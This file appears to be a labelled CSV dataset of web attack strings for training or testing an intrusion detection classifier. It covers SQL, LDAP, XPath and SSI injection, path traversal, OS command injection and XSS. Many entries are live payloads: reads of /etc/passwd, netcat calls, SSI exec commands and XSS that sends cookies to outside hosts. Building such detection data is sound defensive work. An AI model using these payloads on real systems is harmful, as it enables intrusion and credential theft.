,id,class,vector
10893,10893,SSI,"Lugp=<!--  #include virtual=""/etc/passwd"" -->&9mHT=+rhhea"
10896,10896,PathTransversal,oors6c=s~p%]itmochae9s
10903,10903,PathTransversal,/im6asAcfgataeudien/Leix7/mvotrtm0uxawe0ec/oaos7ys28nayefl0yne/etB5BPhrlmFXIaBo9hv/sde3bifqo.php?yvJ3k=oh.vL-l&arfzlmr=%25Hexw%3Fwe&7h=andTaunion2apmio%7E&FEW_fdHNxG2M=trkea%3Aa&5NM8TXmNzF=9hoiaiird&7an05ihs=ehonalogpt&i6=0885753212&29tnlE1Hbi=m1HZc&insertUMI5M_id@a=cnaa&fro5hiltsotrfu=%7Cyb&rfalt=55802
10904,10904,XPathInjection,/eoIp/tjWpptLpQCMcy/ii3oereuempG/aw95tInQt3/h_TX/t5E/e8gUQ7/nabythespgdedqp/JEOwWQ7W7b.htm?ZO5y7Up=eniat%3Dmna%5B2o4phpngee&wrds1ak=ewr0%27++or++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++or+%276orbe0E%27+%3D+++%27&siillne=pD2n.VT&nihi=tKxQ3CsF5BW4
10906,10906,PathTransversal,/s6@hA/UhGqQxOm/an89/a3eAtxrGu.yZL-J9/37I5WzE2s2x.cjYn/cNQOgB.pSVk@YM.asmx?iovfyinceale=d%3A%5Cwinnt%5Cboot.ini
10907,10907,OsCommanding,"/scripts/file.bat"""
10908,10908,XPathInjection,dhetiel=86w7lodj'     or  1<    5Ehfh/w/Pruhi1/child::text()[position()=13]   or  'hidhrl' =  '&nniscxe9aoSaet2=iexecrudeaai]ww
10909,10909,OsCommanding,/eehe1a1itCh8ct5/lHe8zTvknbhZmE/mal/rb/EFM7mB6QzK.msf?achuew=%3B++++echo++%3B+++w+++%3Buname+-a+%3B+id
10915,10915,XSS,/e@WiCkBpwXTi/ngTe/ep2lBGyUn2Q9@H6a/tCCq0w7tQ@jms1Bgzb/Qcopy/tmpKrU/-0/cP9B6nh4rO0/6rtlanf1nfontlras.jpg?tni0Ai=101340&sophrs5ae=ao&nQtwaodd=vtm&gfaWryTe=a%40bjv.E9KCXQ&0execfdfromupdate5Gfe=94&OsRS4tvDCuL.=%3Cobject+++classid+++%3D++++%22+clsid%3A...%22++codebase+%3D++%22javascript%3A+++%5Bdocument.location.replace++++%28%27http%3A%2F%2Fwww.mani.com%2Fcgi-bin%2Ftrni.cgi%27%2Bdocument.cookie%29%3B%5D%22+%3E&n6=ryiiq&ooquvemiscffstu=60393&8od=%266+%3Epl%5De2%3Bsomwl&sa1Ase=ln1hAntrnnhrtvdy&ToanEee=t3throcepdae&r9leYBnFlocation=idNlbhd&roi=eAJIOPvq&Uz5jHRfs9S1=eiinZ
10916,10916,LdapInjection,ennhiaEra4ntbb=mk-mto&5etni5=785915749&telnet6wEChG-gO2=098063&msoruazt1=uw&eonrosuflnlhw70=mwd4nryio1'ec&zng=n&dcatenHa24=69&h3=Olv&nsLdaeraoseua=it1o%&1YCsam6ghimgIDX=rv&hopEti6et=:tHlikeneconnectDd&oOlb&n5ohn7e5iaesm=946
10917,10917,SSI,"elneatnnbY=dd&etnio=45826&aeewn=<!--   #exec     cmd=""/bin/ls    -l     /home/lebiNi/adlihrwmo"" -->&ocoebdtelerGswc=283&oe=77949157&nlaaaNdvonksM=9o&R0eeeseiono=x 0ew&n6tt1nlVeyes1=od?&K.@0ltv8deletej=19523512&phoiorrc61ii=733"
10918,10918,LdapInjection,/ts.php3?rhIt=pttoinc%7EoeUesn1vshutdownhooh&5haato=5&Aczbhhht=ob5ho&0nc=k&NEieoe=sldE9Dtkptht&b6b0X@=3304234&qgO1_g@H@=atrtimgh+drco&cexytIr=AtlashcAer&cou=hcne%29%28++%7C+++%28deega%3D*%29&iogetad1j=sebBltRH&haIiqsdr=24&steSszUR=1688&i9t=5491&edaIn=eboot.ininc27eial&deinrh5l6Hlsw=gB
10922,10922,SqlInjection,t8o=yuz9&auuCne=eEL &BFwleRimgN=72&gi=') UNION    ALL SELECT   smgore     FROM ac    WHERE    (''    =   '&sasXjwnatu=es?s'&eMjsnoxn=mAPiadac\th
10924,10924,SqlInjection,/pkEr9jWRWWBu0aOHk/bw4kgsmae/J0fRjwxtermA/apJR/n2e/CBhY5Qzform/r@P1KdPhnd4LN/eo/nosdaceoslnsnn7p/rpcnCJOpu_Vy/4twnlxOiirlttgyoi.nsf?AnodeOm=35776644&oIstTch5j7=o+d&Hhyqrnhelu=%27%3B++++EXEC+++master..sp_makewebtask++%22%5C%5C70.5.177.76%5Ct9ao5At%5Cht.jpeg%22%2C+%22SELECT+++*+++FROM+++INFORMATION_SCHEMA.TABLES%22&n3ritkeoc2hAN=%26apassthruklh%24-&iBgtjx=d3ahySmelaaen&9pimVrAItie=%3Fchssamcsid&eau43exo=332724&uaesnnrlgs6scq=3644273&gdotrnhl=986918&toa=wjNxs&ambncHAaiigrcoo=dbee
10927,10927,PathTransversal,/wtan/hWOod/oy6y0kKjhJP-l.yLI-0/teeLyT/ht0zenrsN7j/jO.awa3aOghFAC/nprrnI/8gB/fqe4u/h68htn/unionDncO.n@HTXXaJo.aspx?urrbwos=esddctniwvtKeaae&-bGVmochaScg=owslzg%3Bhzt&PLEhveeddh56rs7=173&F@Qfim=aeinrotociynsn4&RcNREAI=eKKmolWvpGP-&oau=5990&yp=fjp%280i&tpnuufmnsgusk=ovriTtrth&tId2SEhfNId=tlannsiIe&tpi1nm3o=n9i&HgexecEqYDdq=qh&kaeInqioRew=e8Cr&zmd4netmoyolaat=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&un83lacsbli=705719&geendcsros=wlKra
10933,10933,PathTransversal,/sCexec/LeH2@mf/peN/htdIF9XEY/e2/q5G/iekdie7ttdeeq/.5gxvdcHQhttpf/C6r-5xT9/tesa8esst6mrily/4mtedzft7.aspx?FzCPchildF=Lasfroma&crfttnaobwshEww=leojnq1set&2jan9Aunehe=i%3A%5Cautoexec.bat&tse=+tgroup+by
10938,10938,XPathInjection,_Y3YQVClpf-=23599773&ti4hDwne=y3K&_OWUBp=pwget&i0nay8gmaeo5=tKP0lUM
10939,10939,OsCommanding,/bBQsyRhakHvZ/ZEeN8Lt8e.jpeg?oeno8taIsoCthii=0&obhc4hrunfaie=489&EcsltwcfIa=%7C++++%2Fusr%2Fbin%2Fnc+-vvv+++124.77.177.139+++++80%2500&nNns9su=0&e8Rosi1=iTadaaahaia&slaax6Rhten=0627194&4zsRozo0l=aBM&sndWteItf8rv=225354&a30gnIgWte=netcattreplace+oIoje1&Gwhohstisshat=n5oe0childe&OVnetcat1Q18R68Y=wqtpesd+o7
10941,10941,XPathInjection,/nQzcqXsdkdpPtcgjRXz/tAm1sbhHqai/sgit8awi5rrem9/hdrU24nEKR/n7s5kudd.cgi?53hh3s2arv=j7PyD&t0hpnhphe=orlide5h%27+or+1%3C+++edooxO%2FZeintk%2F5dn8%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D298%5D++or+++++%27ted%27%3D++%27
10942,10942,SSI,/tww0hnvttVGXq/i0u5EB/cLe/oivpeb6Mluhi/Ddw4nettpEelsDse/l6cQUtRKQjA.cwL/acqe/zSAVTqh_IsOV/mIqpQ-MZ5m.Hz/sUpnJo/Pr8.jpg?oeuxeeha=13843&bafnvdink4ryre1=h5t8z&auigeo3Nrr=anUnthprxi&ssoxie0dt6iat=341&eciyebltoemote=rGay14ocGdXy&7ESeomhed=%296&y0_Gvayo4e=%3C%21--%23email+fromhost%3D%22www.abNlne.com%22+tohost%3D%22mailbox.itgc9.com%22+message%3D%22Evbesf+Ehibnn+eoOetau+nUu%22+fromaddress%3D%22Afubh.com%22+toaddress%3D%22p1a.rahaD.com%22+subject%3D%22at%22+sender%3D%22mtf.com%22+replyto%3D%22hSoed0.com%22+cc%3D%22wde%22+inreplyto%3D%225e+nht+ugtOa%22+id%3D%22laemail%22+--%3E&uneeeprRs=tSsn%28e&itoCrhieI1nesna=488&Mtermapi7ie=+a&eeiecphc=%5B7sialIoGmnMer&eznioooteon=76028
10943,10943,LdapInjection,/oVSDm/aN6IjHQzfii5q.html?aoxtwueoh2l4ari=pr6etu&bsnhieO6xe=%29++%28%7C+%28displayName%3Dhad*%29+%28name+++%3D++++had*++++%29%28++mail%3Dhad*+++%29&.Y2include6=twnsph5iozvSee0&eX0842H=S9pTq+update8ust&SGdinputIdropPXHET=iVeWj.Zr0Qd&yfonosoee0hsc=seCyan+zVh
10944,10944,XPathInjection,/sUnppeacie2ffedr/y8bClrBk9DbPKww-k/pnmtehe5nbgol41i.nsf?p8w7=libeet&Cj@Bw=crthsIb%27++++or+%28i+++%3C++count%28igkhnn%2Fchild%3A%3Atext%28%29%29+and+++++j+++%3C+++++count%28hh%2Fchild%3A%3Acomment%28%29%29++++and+++k+++%3C+++count%28tph%2Fchild%3A%3A*%29++++%29+or++%27hfGtgie%27++++%3D+++%27+++++ehstslo%27+++or&cOsiysweiclnhn=57&1cnKOT@RPW=16697600&4tlyratp=hr8a
10945,10945,XSS,"pnnslrhetmo=hgpo 2slikedroplonmt&vphi=<div   style=""    binding"
10946,10946,SqlInjection,/dsTiu/eN0Uwindow.openOwindow.openscriptreplaceftpN/dqwto/oHwinntCL/l6k@ruyf.vv5Nv_Al/tD8vHt6YbVZz1/hnJRXrY/RGe4elmccAss.mdb?72eIdshttpsinput45=31&haarigmdsDdr=pnwhei9r&goncscro9urn=Okiwiyq&y-._%u=msiti&uErroE9yxTnshso=%27+++group++++by+++++users.id+++having++++78%3D78
10949,10949,XPathInjection,/dxi4zoMxWu8-d/dLLIAx81fk7a3.png?infordTe=93E%7C&4uIdat8ausnete=6T3tlabz%27++++or+++++1%3C+++++ssLg4%2FosYh%2Fe%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D8%5D+or++%27z6%27++++%3D+%27&tteoiGe07dd0tcr=4794
10951,10951,LdapInjection,/d9vRGQ6/ija4suw6heeee/0ccUO6GZIP.php4?Yd_jIOMdropFcp8=1YGtECAuR&icR=g+&twzenmnooswulSe=0S72GXdXy&rQntiptrgsa=obtiea55qgi-&C7lstkubi1wim=nr+y&peco2e0e=xod6e&knemerxFumVse=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&bfsi5nteraeotma=teenoydbysaSl0osee&meue3a=Ekl&hyTyc=82671&imnsJdgc=t8tuautss6be0aw&Rv=rme9
10954,10954,PathTransversal,/scwKv_yRhlD_.htm?soprjbeinL=i7tTsFMXX_d&g1iibhbriofoaOt=o&feso2smzhegoee=h+YMsamf&huiferer4a28ern=ottI9gT0mnty&pt=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&LespuIHg040h4=Nee+8%28to&irtfyueht1tayoh=otu0uOe4
10956,10956,SSI,/iWhnnbae/script@U/irhslueiad4y/HP6wIiiarsbef7OY9/p0bS-uwtKiaHb/taxeUooaas5esGc/eoti7sersrnkr0/echotlnyLISh5Hi5.gif?2igEltlee2mhde=8yvBqIb5&8wTCmettt=I%3D%5C%5Deziaao+h%3Eda6iv&itnOhppm8n=uhmccoohsn5cd&dhaeitXw9Hnwy8=hhras&bsltednrHo2unt=dWy7X&S@2jbg3copy=Drieshieo&sSEeo4r=7812116232&serviceswEvO0formconnectHI=672&jo=9696875938&zci=nFENPYa3u7&oata2By=8160&Dyntbsi=n5qy.uNLx8C&%u23Qm3=%3C%21--+++++%23include++++virtual%3D%22%2Fvar%2Flog%2Fhttpd%2Faccess.log%22++--%3E
10959,10959,XSS,/hXAhJDYQURPCin/oe5ts5uyIs17cmI6ftei/eHvw-2cj./Vcj4pe.dG/NRuhfU6AtO/WVEinsert/teftoh6eoimoap5tS/eG@NhjupMjj5HYH.bin?oolsdttnreaatii=hqo&fycornnr=638&.NqO0EFk=oqqdropi+ewindow.openpndropiepasswd%28r&3tEnnatl8na=m4zsadgtpaudsaADa&7JT3=%3Ca+++++href+%3D%22about%3A%3Cs%26%2399%3Bript+++%3E%5Bdocument.location.replace%28%27http%3A%2F%2Fwww.litansme.com%2Fcgi-bin%2Fdealatesni.cgi%27%2Bdocument.cookie%29%3B%5D%3C%2Fscript%3E%22+%3E&poldN5t9na=fb1lacjndna&igedaykl=pttEeuspasswde&tll4raRSEmdse=6ho8eete&ittTe4=49553982&ndpr=0337864740&fgdsstpao=r%26nh%29iTxDt+t-7y%25uE&dmeltn=162&nmristeondrlsn=929
10964,10964,SSI,/0O3unionaEOGacceptupdatewzXFK/gfFVZDggXz3GLgty/ua7KbBU2f.z5u/eeihbe/se4rTenQiswpNne6cDTB/b.Vz9j5Gi/dit.html?egrrqogaGledim=enodebt&bxFN6ECBB=561761330&vinTo5eoht=%3C%21--++++%23exec+cmd%3D%22c%3A%5Cprogra%7E1%5C6ipigttao%5CRc%5Ci6Sc7et.exe++++d%3A%5CtD15uarnam%5Cwww.niicinnsil.org%5CvsO%5Cdatabase.mdb++%2Fx++exporttofoxpro%22--%3E&ekLodrhoEe6=73213&os7dudFsce=989393
10967,10967,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
10973,10973,LdapInjection,/qqDYmxTq.VEGQx/iRdGy/daumeeooeabv.js?slah1ggbtee=indG&hbstsTuh6=wrmfgnytnZUn&YKJsystem.j=%29+++%28++++%7C++++%28displayName%3Dhad*%29+%28name+%3D++++had*++%29%28mail%3Dhad*++%29
10978,10978,XPathInjection,/e.g/Nes.aspx?qisetsfrlewscb=bex0ohGsam&OQ=iwu&f2v5oHiscool=eil&bB0g7RG=cdsi%27+++++or++++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or+++%27nhtoce%27%3D++++%27&VUDPcg9idSJ=29&bosrdTeqbtTt=08345314&speFaMncxhm7c=0if%26a7Sd60auv3+eqs&5vautoh7tsUont=A&dhorioep2=8&heoltwod1slnlr=vTfAjcuF7E0c&sie0shy=s%25Ti
10979,10979,XPathInjection,/3rd1opfe/wSrbnp3lie/x8vkedku/oHvIR2WwZxZD/2oteyp6a.mspx?PCxtHQRh02=03881604&aoeafsgxdssi=replace+l&enlLz9apmEhewo=dspUCaa&61execLsSEZV=tujtbot2yflpBnuokt
10980,10980,SSI,"od4MiPydbne=<!--#email fromhost=""www.ldawnn.com"" tohost=""mailbox.llggh.com"" message=""nePtft fhsdei 0tnie ai9"" fromaddress=""ete9z.com"" toaddress=""etuIt.aohhdt.com"" subject=""Tel"" sender=""Ani.com"" replyto=""o1ennyg.com"" cc=""nA"" inreplyto=""nDso Etag ofh"" id=""ehaemail"" -->&inh4qErmo=4tyn"
10982,10982,SqlInjection,/dduceninhhlll/havingXkYusWhxQLVIm/0z/seMXckOI5int.hsOS/gt3fdrsm/munA3a-PFf/AnystsoselaL/tyPwoEPZeXmYxcM3U@wr/r-6uJqO/nn85Ef7ahgfdn.css?8a5eE=or+++++0%3C%3E%28select++++count%28*%29+++++from+++++etk%29&osadktlelI7leep=bwgetebeetltm0aEA%5C8p%28&1rIeeohLi=hllt34caazer7ib&olkone2b8th=eatekTne8t&i4ia=l%40j&klnna3npuist=372648&cswchDcolmct=mgorlemeu%3C&lyt=aHeygq.I
10984,10984,XSS,/eeeaztelHv/O7Qb2W/tNPWFcJ/6Q0o5qomprgeez4s/arTfARaXRmpABqdt0p/z52Suin5eEat/7E/l4.J/kVeCW7F6u@.7b/2Xl/nStK0iMw408IXXVo___.asmx?sebooom3saatO=%3F-&odaiIua=52905&Aotb6selbnnw=toesona6bao&eoeretscgt8=58271&wlnse6reoa=326816183&rat=1&XAvbscriptIse-z1=%24s&6ZHM8K=srTeDw&BwodFmAnniilm=optBja6ya0Ause&echHahyzdon=00035498&TkjC-UsZA=%3Cimg%2Bsrc%3Djavascript%3A++++alert%28%27m4.yaraee%27%29+%3E&nthmtahixncuo37=4387692131
10989,10989,XPathInjection,/yCh2-CJGtWc.9/i7gLdatOnzta5/usIYobKKsSLwg8Wo/enc7fU-1divaE53/nsc.dll?Onou=n%2Flnn%2FpEsi%2Fchild%3A%3Anode%28%29%5B+position%28%29%3D897%5D+++++%7C+Oriaic%2Ft%2FerALa%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D1%5D++++or++++%27qaa%27+++%3D++%27&nirorlwtksn=2546217
10990,10990,PathTransversal,Thqeptrnottgeso=8073&1ar=97676&ngi=drohr&nt9oz5=741639&o9bx=e.i-jtQ99&ifE3ntOqlyttedl=Wtattlj&pgS4=7aityovs&eh=%ocldeAnx&4eoOIegguiegam=98&5ahC=/etc/httpd/httpd.conf&xira8hTsm=hUEG&otrbale=92644&Ooz=6066035
10992,10992,SSI,/ihmi5udotoer3ndtzf/rpjHYP5yB8MchSFXSpx3/aIB_lMNAesy_3OAOV/GX/r@7e/K7l_/rsoElrpltttdntui/aFn_P206cxhWa1g/y0ENri6G.sh?jxho7wodp=%3C%21+++%23%3C%21--+++%23exec+cmd%3D%22id%22--%3E&ako=tzV_MuLIVWg&cdharnanbEz=tann%7E%28ee+tn%28+emt%2Binull1
10993,10993,XPathInjection,/g-fxuFybetweenrksbin/e5ijsexU.exe?RBvsVYcmdaZD=948+++or+++++1%3C+++++e%2Fe%2Fn5qui%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D09%5D++++or++++3754%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&awldxtEtb7=eolsO3es%3E%27gyadminb&sGhlnDEijetHph=4zedEFjueuM&aIstaentAsjE=ceH&sdavw=42172&ttrhi=32996&iia0s6sreimqt=edN18HNFRwF&ehphanrfbtliecs=plAupdate5+ke
10996,10996,LdapInjection,/s-/ebnstlhe99cdaSsougn4/6Z2I0nEL6Tmsd/ntvc6eweaIf8dCsjrA/ePb2FxknT5ibk5tQ/S7c/777DO_-r@LSRj35xpz.dll?vei2oXdq=etfedsztu%40wd&ahqn0yis=jaad%29%28%26%28objectClass++%3D++++Eme1*%29
10997,10997,XSS,/rmRuRTNteesh/r3Wb32uiJHSq9xIb/imesn/98.-bfwdIqCP4B6RD6/src7/h9wznoidiepyAt/Lktq/_j@2@/IKs/tj-Njs95E@Du4vc.jpg?aUZWJIz0=%3Cstyle%3E%3C%21--%3C%2Fstyle+%3E%3Cscript++%3E%5Bwindow.open%28%27http%3A%2F%2F223.145.14.11%2Fet.mdb%27%2Bdocument.cookie%29%3B%5D%2F%2F--%3E%3C%2Fscript++%3E
11001,11001,SqlInjection,kpc4Oqd2tTmoat=37725&adeTo6igntl=oUYwHQU&e7nlms1E=0anloyritetoihtpassd&eeesno7ueon7=8915&Fe5SaSsOLkp=82938621&LFQYvz7IKform=ttaoalawsrylee&rSis=lrdnezeorAeddr&pyy=or57q9
11004,11004,XPathInjection,/cBtdTDF/78HlLcAXF03-GICilXF/thoPleeymtta2byrter/a4E2c7/TobjectY8IxmochajAMJt6Y/N-BAyGxMgJzaXg/caenaSetAeLaieltnB/saWuej1/usrlikeCrmSF514wg/pNueoodaEeEqxcipht.php4?Ieqeis0fnmXnie=Cbrv&rag2m=oEvar&asfatQn9vfhTt=6427&7NTC=0203&FC_mA2Vprocessing-instructionDZuz=rnu5i&16=417278&uly5scroyf3iScu=athueaqusrcdsou&Fxdje=ie%3B%24%40&Tssboeclm=20317++or+++++1%3C++++nf%2Fsiarc%2Fd4%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D170%5D++or+795%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&tsctawaqetwoz=lhN&utdt4cayaeEaen=eo6eciacooei
11014,11014,SqlInjection,"ei5ectsdytrazT=SyrameRnhag&sbtrk='   )  UNION    ALL     SELECT     'iiat',05,947,'C3',34   FROM  etl   WHERE  (   ''    = '&ze0cin=eze5a5eee&SSYK=nyremoa6ntd"
11016,11016,OsCommanding,"ooeChD=ouc15l&be=31044&ie=emacopyTPaces6&neeke=t u@ &fmglAaei=rXyJwn3y&ll.iautoexecA81=56597&ermt9ya6oundli=aFH8v&3W-w5u=l?u&unszaoyo=11.114.116.176    | echo ""test"" >evilfile.txt"
11017,11017,PathTransversal,/hlraki/Wlcitxni3isteOD/yoX0Kmv@l/dftXmd8kBHmm/ecHC.vBgil9s/somnrialHt/ie2tvtDedrrvi/hvnwxmnyinmlFal.asp?Taio6p=7569&osh=8&odohciooxeulni=izlgsasroybe2fEfTo&sTylmEs=6694&x.-c=yosr4oerrh
11019,11019,SSI,htaeeidntTenld=L$&nDqhpSe4esnmnii=894&jhtieomcu=o1xvW
11020,11020,LdapInjection,/tuiA3Uz5froi/tjjYS0aUyxlXtQ/iadtikr/htaccesUHp.mspx?nhanuptd=%40t+oetotlST&usrIsiwene4=%29++%28++%7C+++%28kljis%3DhfeAy*%29&esn=bo&t1wnsvnieaets=o9U3h4qLq&djtead=046&ete=nbwheshnEitqpka&h5iOcechn=02474944&9eUtc=eo&eawar=oita%5D9I%29
11022,11022,XPathInjection,/soeptdswdh2as/u6a4zBincludeekpositionlogK5Ir/cEgQr0b7n.c9A27P8Tr/ajaHe4bSoA7S@mu55e/bOnullcFLmj7meta-.cfm?
11023,11023,SqlInjection,itiI4=6293557&erdu=8&3ejelty=emrrItnca0naifftI9l&iIstennCXuhah=e-aa~laaT&us=1560868981&9oHhyhdN=e$caE&ge8rublEye0f=9999664371&s15NS@=tHRG_h6@dFJ&nLTtt5eld=682&uaxhe=oroxterme
11025,11025,LdapInjection,/eo3Ctlutax6itsl/nNyjLV3iKgX4/liNozrurxu3lomvrezi/99boot.iniga/p.o_GImG_EsSLRy_CI/nYC2i5wsLq/cqbdr.png?7mzx7vsEstrn=%29++%28%7C%28Theb%3Dlitr*%29&2p3wl8fSL4ZM=b%40k&qouri=%2B%25G1stdinyodnd0ab&pexntmeeW=sa&zsenaede1tce=pdhtarkA%28nyoeecmyqxo&ncimodu=trtdea&SRadminf8R=677078&zeihpdniSbohtch=tsa0nr&wkb=oaetis2ecgRireahi
11027,11027,SqlInjection,/-vkssiXe57FIcmdS/djlaEgeoOct6U74/elM9ZhDJcjz9_LzFl/0b7UK-b-.Ogb1_h8Khg/ejLdJaC22/VKPp9wlGr2@Q/XC/hTOhWmgZOnomQl/o6nyChaHS.h/FkorpImI_.aspx?urreter=46%5DRfihavingteao&aitn=lroacceptxlpaEaotbneah&gemUtutnEnygznc=anYo&eiie=88639144&veblhshrcbg=nt%28&uen=linkntohit+4&a7=%27++UNION+++++++++++ALL+++++++SELECT++++2eequeocEm+++FROM++++aN++WHERE+++++%27%27+++%3D+++%27&icltntticrlrton=8843292&ir=bgsoundeAcr&yphovWb=fjelM
11031,11031,XSS,/xFcKeG_V9gw/Taccepts/t1n9KQP.zr8jQcO7@/h6Vol_i3B4/eg.dll?XWFQFpositionxbnay=ruvo+5+toast&rohyf=%3Cobject++++classid+++%3D+%22++clsid%3A...%22++++codebase%3D+%22+++javascript%3A+%5Balert+%28%27inemtTeaz%27%29%3B%5D++++%22%3E&raaeafps=51539054&BcbhttpstelnetX=ej6lfB&fvzsmenqFduhel=533196073&tcZobject@odocumentLtmp8sP=eBxTh%40Xtsy&AEchildzZ=titc%27&eamzhab=79231547&bqnbebtth2qpi=9a
11034,11034,LdapInjection,/aAYNi276BmfVtUpuQw/tqwG8UpMdi_r019/Mt@Upsrm/oui/lahgvytjeawekB3.php4?owmievH=32742&bibryeccest5h=euRf&Lmb=999782&8d=xuolnm9s&o7id=esaua&9teiarao7eundir=vGm2%29%28%26%28objectClass++++%3D++Izvs*%29&eti9osRtre=nQYk-&saeYofqt3amnism=su1aoIrdom&aneut8nhl=e&Shmh5utDrjdt=deE%25m
11035,11035,SSI,/aarm0/sE8ednha/nDx0dSgjCL/zrR4/bxStHEi1/nh6Oom7l5o1rsf/hs7Coeyh7g2go.jpeg?rec=t%7Cnsdnw3perlnap&6S=tienuixLeIt&0deudnNe=l_fYiTKM&MAvobody8U=0kdrgwto2co&7oeyoFsdt=+gwp-&r0fkaf=io&0Ntnoeg8haeAxq=tBEBS-J2&bzp9puU1UC=kn&aUEp@z=%3C%21--++++%23include++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22--%3E&lilNh2snrsse=Ae4ew&iac84ml58o9It=t3jX4&lOearlnsg2e=dEE
11042,11042,PathTransversal,/9egilnl0.swf?i2o=ad0&5e=utsleieqrf31a&eeolOrtdnaa=1372321082&wyIOyqOOkU=3694717488&Bhtoieratwna=odfeda5ae9%29tmImail6&bABq=9&OtaOto=38572292&hkcaeaNine=59992&epoznthu8hwr=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&gftN8wimrsTi=8225596&yIlocation75G=cte1ibSx6actetamei&er1esle=wKMs-ZT2s.
11043,11043,SSI,/m4zkz689v@/lftp3iohwerbe3/jdcB/rAC/8dFQPhcidT7@Y/hmUG/uZGIbgf_F2@9xXr/aQqtfSinasUkv.nsf?otx=uA%27e&nesl=oC.BR46UOAx&CNncVf=5dedhso&gmr9eeaierIenb=ta&htog=8&aaN=12887&ln0ke=aVwN3lY.H&Vx0bteptleSo=+p+aj&tdtm=wp-admin&noderaJgdeleteOincludeUzal=16&nazrl=d5u%3Di&lmxu=%3C%21--%23include+virtual%3D%22d%3A%5Cwindows%5Cautoexec.bat%22++++--%3E&ho72oseebcbosjd=n%2Fooetgohed&aEii8ir=ewindow.open%7Ets&pmflEra2kMot=025548
11048,11048,XSS,"taenskd=er &ns49=05648&rnTeituo=dCCT&no1i5r8=c1qpA&iTgoa6erps=%chh&EdhjafzectN9j=7frerx2li&LL3open-1n2p=1&4musLa1=mnlariy&jsShdgE=av_D&iee=wivntedoe&Nlee=3757868&iraH9hkto=<div    style=  ""    background-image"
11049,11049,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
11052,11052,SqlInjection,/y8BeI/trtrntTaeNoap8oooto/eQNhmiF/h1ZGST3IrX1H6QI.js?uu=bYs&Q9SR=8865059&wgetGXElogWma=dhe&NIkhzdfj=%3B&jyee=%3Balter++++table+nearasal++++set+++password++++%3D++%27drie%27++where++++name+++++%3D++++%27ntht%27%3B&jinrladgohqH=8th
11053,11053,XSS,/ze3yeWoisrSsnie/a_lMMHvMRaS5pSCwhN5.tiff?qowTiw=iei&eiin6nr5=%3AsU5nfExg&9esnch=fds&a1wnwicrZ=4kDHfVK%40u4OH&qseyhfcDaDc=rstdinny&xs=%26+im&eeEntntauUiteaS=014&DRncr=8cl&o8Eosotgnt9idaa=etdlEbH&bboClwntnue=eNt_b-rlsaek&2hnCv9=access_log&roqeafawiYtk=%3Cobject+++++classid++%3D%22+clsid%3A...+++++%22+codebase+++%3D++%22+++++javascript%3A+%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.ermeas.com%2Fcgi-bin%2Fsitemele.cgi%27%2Bdocument.cookie%29%3B%5D+++%22++++%3E&GuhfobnAnrecqn7=+aeklvnpassthruekwuy&hxswAgklFofL=rJMPkYh
11058,11058,PathTransversal,/zqvxSPAB/kI8-B-jcBQSz/yTJaT2OjITM.SrBiiT/e8wYt1O/2vFd-x/majt89OH5F.gif?jtiHs=+it+&fn-Rq@9M=cyenSf45a2&ze=emailowtreplacef0Hshee&0aaeL=92873&fru0sty=hejneahai&iUiitE=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini
